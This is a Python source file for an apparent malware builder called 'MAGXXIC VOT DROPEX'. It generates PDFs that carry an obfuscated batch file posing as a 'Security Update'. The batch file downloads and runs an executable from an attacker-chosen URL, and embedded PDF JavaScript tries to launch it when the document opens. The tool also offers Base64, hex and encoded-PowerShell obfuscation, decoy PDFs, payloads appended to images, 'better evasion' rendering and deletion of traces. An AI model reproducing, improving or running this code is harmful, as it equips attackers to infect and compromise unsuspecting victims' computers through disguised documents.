import os
import sys
import base64
import random
import string
import argparse
import asyncio
import img2pdf
import io
from rich.console import Console
from rich.panel import Panel
from rich.progress import Progress, SpinnerColumn, TextColumn
from rich.text import Text
from rich.theme import Theme
from rich.prompt import Prompt, Confirm
from rich.table import Table
from pypdf import PdfWriter, PdfReader
from pypdf.generic import DictionaryObject, NameObject, TextStringObject, ArrayObject, NumberObject
from playwright.async_api import async_playwright
from PIL import Image

# Custom theme for MAGXXIC VOT
custom_theme = Theme({
    "info": "bold cyan",
    "warning": "bold yellow",
    "error": "bold red",
    "success": "bold green",
    "highlight": "bold magenta",
    "banner": "bold gold1"
})

console = Console(theme=custom_theme)

def print_banner():
    banner_text = r"""
  __  __   _    ____ _  __ _  __ ___ ____   __   _____ _____
 |  \/  | / \  / ___| \/ /| |/ /|_ _/ ___|  \ \ / / _ \_   _|
 | |\/| |/ _ \| |  _ \  / | ' /  | | |       \ V / | | || |
 | |  | / ___ | |_| |/  \ | . \  | | |___     | || |_| || |
 |_|  |/_/   \_\____/_/\_\|_|\_\|___\____|    |_| \___/ |_|
    """

    colors = ["bright_red", "orange1", "bright_yellow", "bright_green", "bright_blue", "bright_magenta", "purple"]
    lines = [line for line in banner_text.strip("\n").split("\n") if line.strip()]
    styled_banner = Text()
    for i, line in enumerate(lines):
        color = colors[i % len(colors)]
        styled_banner.append(line + "\n", style=f"bold {color}")

    footer = Text.from_markup("\n[bold white]M A G X X I C   V O T   D R O P E X   v 1 . 2[/]\n[italic cyan]Advanced HTML to PDF Delivery System - Stealth Edition[/]", justify="center")
    styled_banner.append(footer)

    console.print(Panel(styled_banner, border_style="bold cyan", expand=False, padding=(1, 2), subtitle="[bold magenta]Created by MAGXXIC TEAM[/]"))

def obfuscate_bat(content, method):
    if method == "Base64":
        encoded = base64.b64encode(content.encode()).decode()
        return f'@echo off\nset "b64={encoded}"\npowershell -NoProfile -Command "[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($env:b64)) | iex"'

    elif method == "Variable Obfuscation":
        var_name = "".join(random.choices(string.ascii_letters, k=8))
        return content.replace("curl", f"%{var_name}%").replace("@echo off", f"@echo off\nset {var_name}=curl")

    elif method == "PowerShell Encoded":
        ps_cmd = f"$c = '{content}'; iex $c"
        encoded_ps = base64.b64encode(ps_cmd.encode('utf-16le')).decode()
        return f'@echo off\npowershell -NoProfile -ExecutionPolicy Bypass -EncodedCommand {encoded_ps}'

    elif method == "Hex Encoding":
        hex_content = content.encode().hex()
        return f'@echo off\nset "h={hex_content}"\npowershell -NoProfile -Command "$b = for($i=0; $i -lt $env:h.Length; $i+=2){{[Convert]::ToByte($env:h.Substring($i, 2), 16)}}; [System.Text.Encoding]::UTF8.GetString($b) | iex"'

    return content

async def html_to_pdf(html_path, output_pdf_path, payload_url, image_based=False):
    """Converts HTML to PDF using Playwright."""
    try:
        async with async_playwright() as p:
            try:
                browser = await p.chromium.launch()
            except Exception as e:
                if "executable doesn't exist" in str(e).lower() or "playwright install" in str(e).lower():
                    console.print("\n[error]Playwright browsers not found![/]")
                    console.print("[info]Please run the following command to install them:[/]")
                    console.print("[highlight]playwright install chromium[/]\n")
                    sys.exit(1)
                raise e

            page = await browser.new_page()

            with open(html_path, 'r') as f:
                html_content = f.read()

            # Inject payload URL into template
            html_content = html_content.replace("[[PAYLOAD_URL]]", payload_url)

            await page.set_content(html_content)

            if image_based:
                # Capture screenshot and convert to PDF
                img_data = await page.screenshot(full_page=True)
                pdf_bytes = img2pdf.convert(img_data)
                with open(output_pdf_path, "wb") as f:
                    f.write(pdf_bytes)
            else:
                await page.pdf(path=output_pdf_path, format="Letter", print_background=True)

            await browser.close()
    except Exception as e:
        console.print(f"[error]An error occurred during HTML to PDF conversion: {e}[/]")
        sys.exit(1)

async def create_pdf_dropper(payload_url, html_template, image_path, output_pdf, crypt_method, image_based=False, decoy_pdf=None, stego_image=None):
    with Progress(
        SpinnerColumn(),
        TextColumn("[progress.description]{task.description}"),
        console=console
    ) as progress:

        # 1. Create the BAT file
        task1 = progress.add_task("Generating obfuscated payload script...", total=1)
        bat_file = "update_service.bat"

        raw_content = f'@echo off\n'
        raw_content += f'echo Initializing Security Update...\n'
        raw_content += f'curl -o "%TEMP%\\update.exe" "{payload_url}"\n'
        raw_content += f'start "" "%TEMP%\\update.exe"\n'
        raw_content += f'exit\n'

        final_content = obfuscate_bat(raw_content, crypt_method)

        try:
            with open(bat_file, "w") as f:
                f.write(final_content)
            progress.update(task1, completed=1)
        except Exception as e:
            console.print(f"[error]Failed to create BAT file: {e}[/]")
            return

        # 2. Build the base PDF from HTML
        task2 = progress.add_task("Converting HTML to PDF...", total=1)
        temp_pdf = "temp_base.pdf"
        try:
            await html_to_pdf(html_template, temp_pdf, payload_url, image_based=image_based)
            progress.update(task2, completed=1)
        except Exception as e:
            console.print(f"[error]Failed to convert HTML to PDF: {e}[/]")
            return

        # 3. Handle Steganography if requested
        stego_output_img = None
        if stego_image and os.path.exists(stego_image):
            task_stego = progress.add_task("Applying steganography...", total=1)
            try:
                with open(stego_image, "rb") as f:
                    img_data = f.read()
                with open(bat_file, "rb") as f:
                    bat_data = f.read()

                # Append BAT data to the end of image (simple stego)
                stego_output_img = "stego_branding.png"
                with open(stego_output_img, "wb") as f:
                    f.write(img_data)
                    f.write(b"---MAGXXIC_START---")
                    f.write(bat_data)
                    f.write(b"---MAGXXIC_END---")

                # Use this stego image instead of the original one
                image_path = stego_output_img
                progress.update(task_stego, completed=1)
            except Exception as e:
                console.print(f"[warning]Steganography failed: {e}. Falling back to normal image branding.[/]")

        # 4. Handle Image Branding
        temp_image = "temp_image.pdf"
        if image_path:
            task3 = progress.add_task("Injecting branding...", total=1)
            try:
                if os.path.exists(image_path):
                    with open(image_path, "rb") as f:
                        img_pdf_data = img2pdf.convert(f.read())
                    with open(temp_image, "wb") as f:
                        f.write(img_pdf_data)
                    progress.update(task3, completed=1)
                else:
                    console.print(f"[warning]Image path {image_path} not found. Skipping.[/]")
                    image_path = None
            except Exception as e:
                console.print(f"[warning]Image conversion failed: {e}. Skipping.[/]")
                image_path = None

        # 5. Embed file and add JS using pypdf
        task4 = progress.add_task("Crypting and Finalizing PDF...", total=1)
        try:
            writer = PdfWriter()

            # Add decoy PDF pages first if provided
            if decoy_pdf and os.path.exists(decoy_pdf):
                decoy_reader = PdfReader(decoy_pdf)
                for page in decoy_reader.pages:
                    writer.add_page(page)

            if os.path.exists(temp_pdf):
                base_reader = PdfReader(temp_pdf)
                for page in base_reader.pages:
                    writer.add_page(page)

            # Add image page if exists
            if image_path and os.path.exists(temp_image):
                img_reader = PdfReader(temp_image)
                for page in img_reader.pages:
                    writer.add_page(page)

            # Embed the BAT file
            with open(bat_file, "rb") as f:
                writer.add_attachment("Update.bat", f.read())

            # JS payload to launch the embedded file immediately
            js_payload = """
            try {
                this.exportDataObject({ cName: "Update.bat", nLaunch: 2 });
            } catch (e) {}
            """
            writer.add_js(js_payload)

            with open(output_pdf, "wb") as f:
                writer.write(f)

            progress.update(task4, completed=1)
        except Exception as e:
            console.print(f"[error]Failed to finalize PDF: {e}[/]")
            return

        # 6. Cleanup
        finally:
            task5 = progress.add_task("Securely removing traces...", total=1)
            to_remove = [bat_file, temp_pdf, temp_image]
            if stego_output_img:
                to_remove.append(stego_output_img)
            for f_path in to_remove:
                if os.path.exists(f_path):
                    try:
                        os.remove(f_path)
                    except:
                        pass
            progress.update(task5, completed=1)

    console.print(Panel(f"[success]SUCCESS![/]\n\nOutput File: [highlight]{output_pdf}[/]\nEncryption: [highlight]{crypt_method}[/]\nPayload Status: [highlight]Embedded & Crypted[/]", border_style="success"))

async def main():
    print_banner()

    parser = argparse.ArgumentParser(description="MAGXXIC VOT DROPEX PDF Generator")
    parser.add_argument("--payload_url", help="URL of the payload to download.")
    parser.add_argument("--html_template", help="Path to the HTML template.")
    parser.add_argument("--image_path", help="Path to the image to embed (optional).")
    parser.add_argument("--output_pdf", help="Output PDF file name.")
    parser.add_argument("--crypt", choices=["None", "Base64", "Variable Obfuscation", "PowerShell Encoded", "Hex Encoding"], help="Crypting method.")
    parser.add_argument("--image_based", action="store_true", help="Render PDF as an image for evasion.")
    parser.add_argument("--decoy_pdf", help="Decoy PDF to merge with.")
    parser.add_argument("--stego_image", help="Image to hide payload in (steganography).")

    args = parser.parse_args()

    payload_url = args.payload_url
    if not payload_url:
        payload_url = Prompt.ask("[info]Enter Payload URL[/]", default="http://yourserver.com/update.exe")

    html_template = args.html_template
    if not html_template:
        html_template = Prompt.ask("[info]Enter HTML Template Path[/]", default="template.html")

    if not os.path.exists(html_template):
        console.print(f"[error]Template {html_template} not found![/]")
        return

    # Interactive session for new features if not provided in args
    image_based = args.image_based
    if not image_based and not any([args.decoy_pdf, args.stego_image]):
        image_based = Confirm.ask("[info]Use Image-Based PDF Rendering? (Better Evasion)[/]", default=False)

    decoy_pdf = args.decoy_pdf
    if decoy_pdf is None and not any([args.image_based, args.stego_image]):
        if Confirm.ask("[info]Merge with a Decoy PDF?[/]", default=False):
            decoy_pdf = Prompt.ask("[info]Enter Decoy PDF Path[/]")

    stego_image = args.stego_image
    if stego_image is None and not any([args.image_based, args.decoy_pdf]):
        if Confirm.ask("[info]Apply Steganography to branding image?[/]", default=False):
            stego_image = Prompt.ask("[info]Enter Image Path for Stego[/]")

    image_path = args.image_path
    if image_path is None and not stego_image:
        if Confirm.ask("[info]Embed custom image/branding?[/]", default=False):
            image_path = Prompt.ask("[info]Enter Image Path[/]")

    output_pdf = args.output_pdf
    if not output_pdf:
        output_pdf = Prompt.ask("[info]Enter Output Filename[/]", default="SecureDocument.pdf")
        if not output_pdf.endswith(".pdf"):
            output_pdf += ".pdf"

    crypt_method = args.crypt
    if not crypt_method:
        table = Table(title="Available Crypting Methods", border_style="highlight")
        table.add_column("ID", justify="center", style="cyan")
        table.add_column("Method", style="magenta")
        table.add_column("Stealth Level", justify="right")

        table.add_row("1", "None", "Low")
        table.add_row("2", "Base64 Obfuscation", "Medium")
        table.add_row("3", "Variable Obfuscation", "Medium")
        table.add_row("4", "PowerShell Encoded Wrapper", "High")
        table.add_row("5", "Hex Encoding", "High")

        console.print(table)
        choice = Prompt.ask("[info]Select Crypting Method[/]", choices=["1", "2", "3", "4", "5"], default="4")
        mapping = {"1": "None", "2": "Base64", "3": "Variable Obfuscation", "4": "PowerShell Encoded", "5": "Hex Encoding"}
        crypt_method = mapping[choice]

    console.print(f"\n[info]Ready to generate [highlight]{output_pdf}[/] with requested features.[/]")

    if Confirm.ask("[success][bold]START GENERATION?[/][/]", default=True):
        try:
            await create_pdf_dropper(payload_url, html_template, image_path, output_pdf, crypt_method, image_based=image_based, decoy_pdf=decoy_pdf, stego_image=stego_image)
        except KeyboardInterrupt:
            console.print("\n[warning]Operation cancelled by user.[/]")
        except Exception as e:
            console.print(f"[error]An unexpected error occurred: {e}[/]")
    else:
        console.print("[warning]Aborted.[/]")

if __name__ == "__main__":
    asyncio.run(main())
